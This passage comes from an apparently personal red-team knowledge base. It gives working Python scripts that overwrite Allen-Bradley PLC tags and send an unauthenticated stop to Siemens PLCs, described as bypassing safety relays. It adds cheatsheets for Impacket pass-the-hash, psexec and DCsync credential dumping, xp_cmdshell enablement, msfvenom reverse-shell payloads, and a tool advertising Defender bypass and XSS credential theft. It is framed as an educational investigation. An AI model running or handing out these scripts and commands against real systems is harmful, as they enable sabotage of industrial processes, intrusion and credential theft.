receive feedback, making them essential tools for supervising industrial and manufacturing operations.</p> </li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/ICS%20Overview/#ics-scada-network-introduction","title":"ICS SCADA Network Introduction","text":"<ul> <li>ICS SCADA environments...<ol> <li>are simple networks and have low complexity.<ul> <li>Statically set IPs.</li> <li>Rarely contain services (e.g., DHCP, DNS).</li> <li>Reused passwords.</li> <li>Not frequently updated.</li> </ul> </li> <li>require high availability.<ul> <li>No Intrusion Prevention System (IPS).</li> <li>Can't do mass network scans (risk breaking the network).</li> </ul> </li> <li>have a simple exploitation checklist:<ul> <li>Determine what protocol is being used for communication (e.g., S7COMM, CIP).</li> <li>Find the target PLC (e.g., check ARP table, discovery via broadcast).</li> <li>If you can ping it, you can pwn it.</li> </ul> </li> </ol> </li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/","title":"Allen Bradley","text":"<p>Before reading, make sure you are familiar with ICS components and their correlated acronyms. Please reference the\u00a0ICS Overview\u00a0for an introduction.</p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#tldr","title":"TL;DR","text":"<ul> <li> <p>Allen-Bradley PLCs communicate over the Common Industrial Protocol (CIP).</p> <ul> <li>This protocol is an open standard supported by the Open DeviceNet Vendors Association. (ODVA).</li> </ul> </li> <li> <p>Allen-Bradley produces a handful of distinct PLC families, but this report will only cover the two families we encountered and tested.</p> <ul> <li>MicroLogix: the more cost-effective, compact, and simpler lineup of PLCs</li> <li>ControlLogix: the higher-end, more powerful, and more scalable lineup of PLCs</li> </ul> </li> </ul> <ul> <li> <p>Three PoC's were developed using the <code>pycomm3</code> Python library -- one for general Allen-Bradley PLC enumeration and two for reading and writing data (one for the <code>MicroLogix</code> models and one for the <code>ControlLogix</code> models).</p> <ol> <li> <p>The Allen-Bradley Enumeration PoC simply performs an open network broadcast to return a list of all available Allen-Bradley based devices (to include HMI's).  This PoC also attempts to detect and return information of all utilized PLC slots on a specified target.</p> </li> <li> <p>The Allen-Bradley ControlLogix Read/Write PoC extracts the current running configuration of a specified ControlLogix PLC. The attacker then inputs the target \"tag\" (or a local variable) from the returned configuration, and the specified tag is then continuously overwritten via an infinite loop to achieve a desired effect.</p> </li> <li> <p>The Allen-Bradley MicroLogix Read/Write PoC reads the current value of a specified \"tag\" (or a local variable) on a target MicroLogix PLC, and prompts the user for the new value to send and overwrite. This PoC demonstrates a more sophisticated attack on the PLC's internal logic is possible. </p> </li> </ol> </li> <li> <p><code>pycomm3</code> Library Documentation:  https://docs.pycomm3.dev/en/latest/</p> </li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#allen-bradley-overview","title":"Allen-Bradley Overview","text":"<p>Context</p> <p>This note stems from a personal report written during an educational investigation into ICS infrastructure.</p> <p>We began our ICS investigation with packet analysis of Allen-Bradley communications. This led us to CIP, and subsequently the <code>pycomm3</code> Python library for our PoCs.</p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#common-industrial-protocol-cip","title":"Common Industrial Protocol (CIP)","text":"<p>The Common Industrial Protocol (CIP) is a protocol used in industrial automation and control systems, and is the primary protocol we discovered being used by Allen-Bradley devices.  It is not an open, documented standard like some other industrial communication protocols such as Modbus or OPC (OLE for Process Control).  Instead, CIP is associated with the EtherNet/IP protocol, which is one of the protocol variants under the CIP umbrella.</p> <p>CIP is an application layer protocol managed by ODVA (Open DeviceNet Vendor Association), a consortium of industrial automation companies. While ODVA provides some level of documentation and specifications for EtherNet/IP and CIP, it is not considered an entirely open and freely available standard in the same way that some other protocols are.</p> <p>Once the <code>pycomm3</code> library was found, focus was shifted to PoC development over packet analysis.</p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#allen-bradley-enumeration-poc","title":"Allen-Bradley Enumeration PoC","text":"<p>The following Allen-Bradley Enumeration PoC simply performs an open network broadcast to return a list of all available/reachable Allen-Bradley based devices (to include both PLC's and HMI's).  After returning information on all available Allen-Bradley devices, the PoC prompts the user to enumerate the slots on a specified device.  Once input, it attempts to automatically detect and return information of all utilized PLC slots on the specified target.</p> <p>Install Dependencies: <pre><code>pip install pycomm3\n</code></pre></p> <p>Proof-of-Concept: <pre><code>from pycomm3 import CIPDriver\nimport sys\n\n# Discovery\nprint(\"[+] Discovering available hosts on the network...\")\ndiscovery_data = CIPDriver.discover()\n\n# Visual Formatting of Data\nfor i in discovery_data:\n  formatted_str = \"\\n\".join([f\"{key}: {value}\" for key, value in i.items()])\n  print(\"\\n\" + formatted_str)\n\n# Attempting to Open connection...\nip = input(\"\\n[+] Input IP to Enumerate: \")\n\ntry:\n  cipObj = CIPDriver(ip)\n  connected = cipObj.open()\n  print(\"[+] Connection successful.\")\nexcept:\n  print(\"[-] Connection unsuccessful.\")\n  sys.exit()\n\n# List all slot information\nprint(\"[+] Attempting to print slot data...\")\n\n# Determine amount of slots available on target\nfor i in range(10,-1,-1):\n  try:\n    cipObj.get_module_info(i)\n    total_slots = i\n    break\n\n  except:\n    total_slots = None\n    continue\n\n# View Data in all available Slots\nif total_slots is None:\n  print(\"[-] Unable to determine PLC slot quantity.\")\n\nelse:\n  for i in range(0,(total_slots + 1)):\n    print(\"\\n[+] Slot: \" + str(i))\n    ugly_slot_data = cipObj.get_module_info(i)\n    slot_string = \"\\n\".join([f\"{key}: {value}\" for key, value in ugly_slot_data.items()])\n    print(slot_string)\n</code></pre></p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#allen-bradley-controllogix-readwrite-poc","title":"Allen-Bradley ControlLogix Read/Write PoC","text":"<p>The Allen-Bradley ControlLogix Read/Write PoC extracts the current running configuration of a specified ControlLogix PLC. The attacker then inputs the target \"tag\" (or a local variable) from the returned configuration, and the specified tag is then continuously overwritten with a value via an infinite loop to achieve a desired effect.</p> <ul> <li>The continuous loop is required because the overwritten value is volatile, and returns to the original value immediately after the writing is complete.</li> </ul> <p>Install Dependencies: <pre><code>pip install pycomm3\n</code></pre></p> <p>Proof-of-Concept: <pre><code>from pycomm3 import LogixDriver\nimport sys\n\n# Target information\nprint(\"[+] Allen-Bradley ControlLogix\")\nip = input(\" o  Input IP: \")\n\n# Connect and Acquire Existing Variable names\ntry: \n  obj = LogixDriver(ip)\n  connected = obj.open()\nexcept:\n  print(\"[-] Connection failed.\")\n  sys.exit()\n\nobj.get_tag_list()\n\nprint(\"\\n[+] Listing Available Tags:\")\nprint(\" o  Tags containing 'I' are for input.\")\nprint(\" o  Tags containing 'O' are for ouptut.\")\nprint(\" o  Tags containing 'C' are for error handling.\\n\")\n\nfor tag in obj.tags:\n  print(tag)\n\ntag = input(\"\\n[+] Input Target Tag: \")\n\n# Constantly Write Data to an Existing Variable\nprint(\"\\n[+] Writing constant data to '\" + tag + \"'...\")\n\n# Write to \"Input\" variable\nif 'I' in tag:\n  while True:\n    obj.write(tag, {'Fault':0, 'Data': 1})\n\n# Write to \"Output\" variable\nelif 'O' in tag:\n  while True:\n    obj.write(tag,{'Data', 1})\n\n# Unsupported tag\nelif \"C\" in tag:\n  print(\"[-] 'C' tag currently not supported.\")\n\nelse:\n  print(\"[-] Invalid tag.\")\n</code></pre></p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Allen-Bradley/#allen-bradley-micrologix-readwrite-poc","title":"Allen-Bradley MicroLogix Read/Write PoC","text":"<p>The Allen-Bradley MicroLogix Read/Write PoC reads a the current value of specified \"tag\" (or a local variable) on a target MicroLogix PLC, then prompts the user for the new value to send and overwrite. This PoC demonstrates a more sophisticated attack on the PLC's internal logic is possible.</p> <ul> <li> <p>Unlike the ControlLogix Read/Write PoC, the value set here is not volatile.  Meaning once the value is sent to the PLC, the value is written and remains.</p> </li> <li> <p>This PoC received the least amount of time, so it is the least robust and requires more development.</p> </li> </ul> <p>Install Dependencies: <pre><code>pip install pycomm3\n</code></pre></p> <p>Proof-of-Concept: <pre><code>from pycomm3 import SLCDriver\nimport sys\n\n# Target information\nprint(\"[+] Allen-Bradley MicroLogix\")\nip = input(\" o  Input IP: \")\n\n### Hardcoded Tags because SLCDriver does not support tag dumping:\n# outputs = O0:0\n# Inputs = I1:0\n# Status = S2:0\n# Binary = B3:0\n# Timer = T4:0\n# Counter = C5:0\n# Control = R6:0\n# Integer = N7:0\n# Float = F8:0\n# Custom Types = N 10+\n\n# Example tag being used\ntag = 'N7:0'\n\n# Attempt Connection\ntry:\n  obj = SLCDriver(ip)\n  obj.open()\nexcept:\n  print(\"[-] Connection failed.\")\n  sys.exit()\n\n# Read Current Value\nfirst_int = obj.read(tag)\nprint(f\"\\n[+] Value before the Write: '{first_int}'\")\n\nvalue = input(\"[+] Input new integer value to set: \")\n\n# Write Next Value\nobj.write([tag,int(value)])\nfirst_int = obj.read(tag)\nprint(f\"[+] Value after the Write: '{first_int}'\")\n</code></pre></p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Siemens/","title":"Siemens","text":"<p>Before reading, make sure you are familiar with ICS components and their correlated acronyms. Please reference the\u00a0ICS Overview\u00a0for an introduction.</p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Siemens/#tldr","title":"TL;DR","text":"<ul> <li> <p>Siemens PLCs communicate over the S7COMM protocol.</p> <ul> <li>This protocol is proprietary, so all documentation is based on open-sourced analysis.</li> <li>Protocol Breakdown:<ul> <li>http://gmiru.com/article/s7comm/</li> <li>http://gmiru.com/article/s7comm-part2/</li> </ul> </li> </ul> </li> <li> <p>Newer, higher end models can use the more robust S7COMM+ protocol which has more robust security features.</p> <ul> <li>This protocol is proprietary, and much less documented than standard S7COMM.</li> <li>We did not encounter this protocol during the engagement.</li> <li>For the purpose of the Siemens overview, we will be focusing on the more common S7COMM protocol.</li> </ul> </li> <li> <p>The Siemens Emergency Stop PoC is a Python Proof-of-Concept that utilizes the <code>snap7</code> library to send an unauthenticated shut down to a reachable Siemens PLC. </p> <ul> <li>This emergency stop should bypass smart relays that would normally block potentially dangerous input.</li> </ul> </li> <li> <p><code>snap7</code> Library Documentation: https://python-snap7.readthedocs.io/en/latest/</p> </li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Siemens/#siemens-overview","title":"Siemens Overview","text":"<p>Context</p> <p>This note stems from a personal report written during an educational investigation into ICS infrastructure.</p> <p>We began our ICS investigation with packet analysis of Siemens communications.  This led us to the S7COMM protocol, and subsequently the <code>snap7</code> Python library for our PoC.</p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Siemens/#s7comm-protocol","title":"S7COMM Protocol","text":"<p>We discovered that Siemens PLCs communicate over the S7COMM protocol (with the most common default port found being 102).  This protocol is proprietary, so official documentation is scarce.  However, there exists some public blogposts from enthusiasts conducting their own breakdown of the protocol.  </p> <p>The following sections cover the key points breaking down the protocol, as well as corroborating it with our findings.</p> <p>Header Breakdown: Source:  http://gmiru.com/article/s7comm/</p> <p></p> <ul> <li> <p>Protocol ID: <code>[1byte]</code> protocol constant always set to 0x32 (and 0x72 for S7COMM+)</p> </li> <li> <p>Message Type: <code>[1byte]</code> the general type of the message (sometimes referred as ROSCTR type)</p> <ul> <li>0x01 - Job Request: request sent by the master (e.g. read/write memory, read/write blocks, start/stop device, setup communication)</li> <li>0x02 - Ack: simple acknowledgement sent by the slave with no data field (I have never seen it sent by the S300/S400 devices)</li> <li>0x03 - Ack-Data: acknowledgement with optional data field, contains the reply to a job request</li> <li>0x07 - Userdata: an extension of the original protocol, the parameter field contains the request/response id, (used for programming/debugging, SZL reads, security functions, time setup, cyclic read..)</li> </ul> </li> <li> <p>Reserved: <code>[2bytes]</code> always set to 0x0000 (but probably ignored)</p> </li> <li> <p>PDU reference: <code>[2bytes]</code> generated by the master, incremented with each new transmission, used to link responses to their requests,\u00a0Little-Endian\u00a0(note: this is the behaviour of WinCC, Step7, and other Siemens programs, it could probably be randomly generated, the PLC just copies it to the reply)</p> </li> <li> <p>Parameter Length: <code>[2bytes]</code> the length of the parameter field,\u00a0Big-Endian</p> </li> <li> <p>Data Length: <code>[2bytes]</code> the length of the data field,\u00a0Big-Endian</p> </li> <li> <p>(Error class): <code>[1byte]</code> only present in the\u00a0Ack-Data\u00a0messages</p> </li> <li> <p>(Error code): <code>[1byte]</code> only present in the\u00a0Ack-Data\u00a0messages</p> </li> </ul> <p>General Data &amp; Authentication Breakdown: Source: http://gmiru.com/article/s7comm-part2/</p> <p></p> <p>There are three protection modes that can be set during configuration for the CPU. - No protection: Just as one would expect no authentication is required. - Write protection: For\u00a0certain\u00a0data write and configuration change operations authentication is required. - Read/Write protection: Just like the previous one but\u00a0certain\u00a0read operations require authentication as well.</p> <p>If authentication is required the password is sent to the device, in a\u00a0userdata\u00a0message, which lowers the effective protection level.  The issue with this is that the password is six bytes in length and sent almost in the clear (XORed with constants and shifted); it is replayable and can be bruteforced. The protocol also provides no integrity or confidentiality protection, message injection and modification is possible. The general rule of thumb when it comes to S7 security is\u00a0if you can ping the device you can own it.</p> <p>It must be noted here that the S7-1200/1500 series devices use a slightly different approach, protection levels are handled a bit differently and the password sent is significantly longer (it is actually the hash of the password) but it is still constant and replayable.</p> <ul> <li> <p>Function Code: <code>[1byte]</code> indicates the purpose of the message/packets being sent</p> <ul> <li> <p>0x04/0x05 - Read/Write Variable: out of scope</p> <ul> <li><code>0x04</code>: Read Variable</li> <li><code>0x05</code>: Write Variable</li> </ul> </li> <li> <p>0x1a/0x1f - Block Upload/Download: out of scope</p> <ul> <li><code>0x1a</code>: Request Download</li> <li><code>0x1b</code>: Download Block</li> <li><code>0x1c</code>: Download Ended</li> <li><code>0x1d</code>: Start Upload</li> <li><code>0x1e</code>: Upload Block</li> <li><code>0x1f</code>: End Upload</li> </ul> </li> <li> <p>0x28 - PLC Control: used to execute different routines on a target PLC that modify its execution/memory state. Should include a routine/function name and an associated \"parameter\" or \"argument\" in the PDU following the Function Code (in Wireshark, this would be the \"PI (Program Invocation) Service\").  Example routines:</p> <ul> <li><code>_INSE</code>: activates a downloaded block on the device; parameter: name of the block</li> <li><code>_DELE</code>: remove a block from the file system of the device; parameter: name of the block</li> <li><code>P_PROGRAM</code>: sets the run state of the device (start, stop, memory reset); parameter: none</li> <li><code>_GARP</code>: compresses PLC memory; parameter: unknown</li> <li><code>_MODU</code>: copy RAM to ROM; parameter: filesystem identifiers</li> </ul> </li> <li> <p>0x29 - PLC Stop: similar to PLC Control, but with no parameter in the message and routine is always set to <code>P_PROGRAM</code>. </p> <ul> <li>Unknown why this gets its own function code instead of just using 0x28.</li> <li>This is our primary focus for a PoC exploit.</li> </ul> </li> </ul> </li> </ul> <p>Example</p> <p>With this knowledge, to send a PLC Stop command the key takeaways are:</p> <p>Protocol ID: <code>0x32</code> | S7COMM Message Type: <code>0x01</code> | Job Request Function Code: <code>0x29</code> | PLC Stop PI Service: <code>0x50 0x5f 0x50 0x52 0x4f 0x47 0x52 0x41 0x4d</code> | P_PROGRAM</p> <p>The below image is a Wireshark capture displaying the above PLC Stop example.</p> <ul> <li>It is also worth noting that the destination MAC gives away that the target is a Siemens device.  This means that an attacker in theory could passively determine a target PLC purely from an ARP table; no active scanning required.</li> </ul> <p></p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/Vendors/Siemens/#siemens-emergency-stop-poc","title":"Siemens Emergency Stop PoC","text":"<p>The Siemens Emergency Stop PoC utilizes the <code>snap7</code> Python library to send an unauthenticated shut down to a reachable Siemens PLC.  A common defense in ICS networks is smart relays -- which normally block potentially dangerous input to PLCs.  However, this emergency stop should bypass the relays due to not inherently being \"dangerous\".</p> <p>The following PoC has only been tested on a Siemens S400.  Based on some unofficial documentation found using OSINT, the following table could correlate the code to other models.</p> Siemens Model Connection Parameters S400 <code>(ip,0,0,port)</code> S200 <code>(ip,0,1,port)</code> S300 <code>(ip,0,2,port)</code> <p>Install Dependencies:</p> <pre><code>pip install python-snap7\n</code></pre> <p>Proof-of-Concept:</p> <pre><code>import snap7\nimport sys\n\n### Siemens Emergency Stop PoC (tested on an S400) ###\n# Create a local test server with: \"python -m snap7.server --port 102\"\n\n# Input Target PLC Data\nprint(\"[+] Input Siemens PLC information\")\nip = input(\" o  Target IP: \")\nport = input(\" o  Target Port (default: 102): \")\n\n# Validate Connection\nprint(\"[+] Connecting to target PLC (\" + ip + \") on port '\" + str(port) + \"'...\")\ntry:\n  client = snap7.client.Client()\n  client.connect(ip,0,0,int(port)) # Connect to S400\n  client.wait_as_completion(5000)\nexcept:\n  print(\"[-] Failed to connect.\")\n  sys.exit()\n\n# Attempt to shut down PLC (redundant)\nconnected = client.get_connected()\nif connected:\n  print(\"[+] Shutting down PLC...\")\n  client.plc_stop()\nelse:\n  print(\"[-] Client not connected.\")\n</code></pre> <p>Proof-of-Concept Packet Capture:</p> <p></p> <p></p>"},{"location":"Red%20Cell/14.%20Cheatsheets/","title":"Cheatsheets","text":"<ul> <li>This section covers the TL;DR (Too Long; Didn't Read) notes of different toolsets.  Instead of reading large and verbose wikis, this will give you a simple introduction.</li> </ul>"},{"location":"Red%20Cell/14.%20Cheatsheets/#table-of-contents","title":"Table of Contents","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/#c2-frameworks","title":"C2 Frameworks","text":"<ul> <li>(To-Do) Cobalt Strike Cheatsheet</li> <li>(To-Do) Metasploit Cheatsheet</li> <li>(To-Do) Sliver C2 Cheatsheet</li> </ul>"},{"location":"Red%20Cell/14.%20Cheatsheets/#tools","title":"Tools","text":"<ul> <li>Impacket Cheatsheet</li> <li>MSFvenom Cheatsheet</li> <li>PoorMansArmory Cheatsheet</li> <li>Rubeus Cheatsheet</li> </ul>"},{"location":"Red%20Cell/14.%20Cheatsheets/C2%20Frameworks/%28To-Do%29%20Cobalt%20Strike%20Cheatsheet/","title":"(To Do) Cobalt Strike Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/C2%20Frameworks/%28To-Do%29%20Metasploit%20Cheatsheet/","title":"(To Do) Metasploit Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/C2%20Frameworks/%28To-Do%29%20Sliver%20C2%20Cheatsheet/","title":"(To Do) Sliver C2 Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/","title":"Impacket Cheatsheet","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#overview","title":"Overview","text":"<p>Impacket is an invaluable library of python-based exploitation tools.  The library also reuses a lot of authentication methods and syntax, so in a lot of cases you can get away with simply changing the specific impacket command being ran without needing to change any parameters.</p> <p>On Kali Linux, the impacket library is in your path by default and each python script is prefaced with \"impacket-\" for more intuitive usage.</p> <pre><code># Example Usage of Raw Library\npython3 psexec.py &lt;domain&gt;/&lt;username&gt;:'&lt;password'@&lt;target&gt;\n\n# Example Usage on Kali Linux\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;:'&lt;password'@&lt;target&gt;\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-smbserver","title":"impacket-smbserver","text":"<p>Create a simple unauthenticated SMB server that can host files and capture the NTLM hash of visitors.</p> <pre><code># Host Current Directory\nimpacket-smbserver &lt;share_name&gt; -smb2support .\n\n# Host Specified Directory\nimpacket-smbserver &lt;share_name&gt; -smb2support &lt;path_to_serve&gt;\n\n# Path to Share\n# \\\\&lt;ip_addr&gt;\\&lt;share_name&gt;\\&lt;hosted_files&gt;\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-smbclient","title":"impacket-smbclient","text":"<p>Connect to a workstation via SMB and attempt to interact with with available shares. (Requirements: Valid user credentials.)</p> <pre><code># Smbclient via Password\nimpacket-smbclient &lt;domain&gt;/&lt;username&gt;:'&lt;password'@&lt;target&gt;\n\n# Smbclient via Pass-the-Hash\nimpacket-smbclient &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -hashes &lt;ntlm&gt;:&lt;ntlm&gt;\n\n# Smbclient via Kerberos Ticket\nexport KRB5CCNAME=/path/to/&lt;krb5cc_ticket&gt;\nimpacket-smbclient &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -k -no-pass\n\n# Common Commands             : cat, ls, cd, mkdir, rmdir\n# List Available Shares       : shares\n# Mount Share                 : use &lt;share_name&gt;\n# Upload File                 : put &lt;local_filename&gt;\n# Download File               : get &lt;remote_filename&gt;\n# Download All Files from PWD : mget &lt;match_mask&gt;\n# Change the User's Password  : password\n# Return Host Information     : info\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-psexec","title":"impacket-psexec","text":"<p>Acquire a SYSTEM level shell via exploiting write privileges in the default ADMIN$ share. (Requirements: Credentials for a user with SMB write privileges to the ADMIN$ share.)</p> <pre><code># Psexec via Password\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password'@&lt;target&gt;\n\n# Psexec via Pass-the-Hash\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -hashes &lt;ntlm&gt;:&lt;ntlm&gt;\n\n# Psexec via Kerberos Ticket\nexport KRB5CCNAME=/path/to/&lt;krb5cc_ticket&gt;\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -k -no-pass\n\n# Optional: add a specific command to execute (default: cmd.exe)\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@&lt;target&gt; '&lt;command_to_execute&gt;'\n\n# Return Help                    : help\n# Execute Local Commands         : !&lt;local_command&gt;\n# Upload Files to Temp Directory : lput &lt;local_file&gt; Temp\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-secretsdump","title":"impacket-secretsdump","text":"<p>Perform a DCsync attack on a Domain Controller and dump all user and machine hashes within the domain. (Requirements: Domain Administrator Privileges)</p> <pre><code># DCsync via Password\nimpacket-psxec &lt;domain&gt;/&lt;domain_admin&gt;:'&lt;password&gt;'@&lt;target_dc&gt; &gt; &lt;outfile.txt&gt;\n\n# DCsync via Pass-the-Hash\nimpacket-secretsdump &lt;domain&gt;/&lt;domain_admin&gt;@&lt;target_dc&gt; -hashes &lt;ntlm&gt;:&lt;ntlm&gt; &gt; &lt;outfile.txt&gt;\n\n# DCsync via Kerberos Ticket\nexport KRB5CCNAME=/path/to/&lt;krb5cc_ticket&gt;\nimpacket-secretsdump &lt;domain&gt;/&lt;domain_admin&gt;@&lt;target_dc&gt; -k -no-pass &gt; &lt;outfile.txt&gt;\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-mssqlclient","title":"impacket-mssqlclient","text":"<p>Connect to a MS-SQL database. (Requirements: Valid DB user credentials.)</p> <pre><code># Connect to MS-SQL Server\nimpacket-mssqlclient &lt;username&gt;:'&lt;password&gt;'@&lt;target&gt;\n\n# Connect to MS-SQL Server via default SA creds\nimpacket-mssqlclient sa:'poiuytrewq'@&lt;target&gt;\n\n# Enable XP_CMDSHELL for Remote Code Exection\n&gt; EXECUTE sp_configure 'show advanced options', 1;\n&gt; RECONFIGURE;\n&gt; EXECUTE sp_configure 'xp_cmdshell', 1;\n&gt; RECONFIGURE;\n&gt; xp_cmdshell '&lt;command&gt;'\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/#impacket-addcomputer","title":"impacket-addcomputer","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/","title":"MSFvenom Cheatsheet","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/#overview","title":"Overview","text":"<p>msfvenom is a payload generator that is utilized by the Metasploit framework.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/#usage","title":"Usage","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/#generic-syntax","title":"Generic Syntax","text":"<pre><code># Payload\nmsfvenom -p &lt;payload_type&gt; -f &lt;format&gt; -e &lt;encoding&gt; LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; &gt; &lt;output_file&gt;\n\n# Listener\nmsfconsole -q -x \"use multi/handler; set payload &lt;payload_type&gt;; set LHOST &lt;attacker_ip&gt;; set LPORT &lt;listening_port&gt;; exploit\"\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/#common-parameters","title":"Common Parameters","text":"<pre><code># Payload Types:\nwindows/shell/reverse_tcp\nwindows/shell/reverse_http\nwindows/powershell_reverse_tcp\nwindows/meterpreter/reverse_tcp\nwindows/meterpreter/reverse_https\n\n# Formats:\nexe\nexe-service\npsh-reflection\n\n# Encoding\nx86/shikata_ga_nai\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/MSFvenom%20Cheatsheet/#examples","title":"Examples","text":"<pre><code># List Payloads\nmsfvenom -l payloads \n\n# List Encoders\nmsfvenom -l encoders\n\n# Windows x64 Meterpreter HTTPS Reverse Shell (.ps1)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; -f psh-reflection &gt; meterpreter_x64.ps1\n\n# Windows x86 Executable w/ Polymorphic Encoding (.exe)\nmsfvenom -p windows/shell/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; &gt; normal_payload.exe \n\n# Windows x86 Service Executable /w Polymorphic Encoding (.exe)\nmsfvenom -p windows/shell/reverse_tcp -f exe-service -e x86/shikata_ga_nai LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; &gt; service_payload.exe\n\n# Simple TCP Bind Shell (.exe)\nmsfvenom -p windows/shell/bind_tcp RHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; -f exe &gt; bind_payload.exe \n\n# HTTP Meterpreter Reverse Shell (.exe)\nmsfvenom -p windows/meterpreter/reverse_http LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; -f exe &gt; http_meterpreter.exe\n\n# Windows x86 PowerShell Reverse Shell (.msi)\nmsfvenom -p windows/powershell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; -f msi &gt; powershell_payload.msi\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/","title":"PoorMansArmory Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#overview","title":"Overview","text":"<p>Tip</p> <p>The PoorMansArmory repository can be found here.</p> <p>PoorMansArmory is a personal project of mine that is a collection of robust Windows-based payload generators and tools that aim to bypass AMSI, Windows Defender, and self-signed certificate checks. Tools range from a custom python HTTP(s) server, robust PowerShell reverse shell generator, remote template injected .docx generator, XSS and XXE PoC payloads, etc.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#usage","title":"Usage","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#import-pmaps1","title":"<code>Import-PMA.ps1</code>","text":"<p>This is a simple script to import the primary PoorMansArmory scripts into the current session, while ignoring the less important ones (i.e., <code>misc</code>, <code>officemacros/lib</code>).</p> <p>Syntax: <pre><code>. ./Import-PMA.ps1\n</code></pre> </p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#pma_serverpy","title":"<code>pma_server.py</code>","text":"<pre><code># Synopsis:\n# Simple Flask web server for bi-directional file transfers, supporting\n# both HTTP and HTTPS using self-signed certificates.  Intended to be\n# used with the PowerShell WebClient helper script(s).\n\n# Version 4.0.0 introduces Web Exploitation:\n#  o  XSS Cookie Exfiltration\n#  o  XSS Saved Credential Exfiltration\n#  o  XSS Keylogging\n#  o  XXE Data Extraction \n\n# Parameters:\n# --directory &lt;string&gt;  (default: ./uploads)\n# --port &lt;int&gt;          (default: 80)\n# --ssl                 (default: false)\n# --debug               (default: false)\n# --help\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#webclienthelpers","title":"WebClientHelpers","text":"<p>Optional \"WebClientHelpers\" can be added to either the reverse shell or into a session, adding <code>download</code>, <code>upload</code>, and <code>import</code> functionality, allowing seemlessly communication with the <code>pma_server.py</code> web server for lateral file transfers. The<code>import</code> fuctionality specifically will attempt to remotely load hosted files into the session.  If the filename ends with <code>.dll</code> or <code>.exe</code>, the function will attempt .NET reflection. Otherwise, the function will attempt to load the file assuming it contains PowerShell code.</p> <ul> <li>Using the -WebClientHelpers or -WebClientHelpersURL  parameters with <code>Get-RevShell.ps1</code> will incorporate them into the reverse shell payload. <li>Using <code>Load-WebClientHelpers.ps1</code> can retro-actively load them into the current session using Global scopes.</li> <p>Functions TL;DR: - 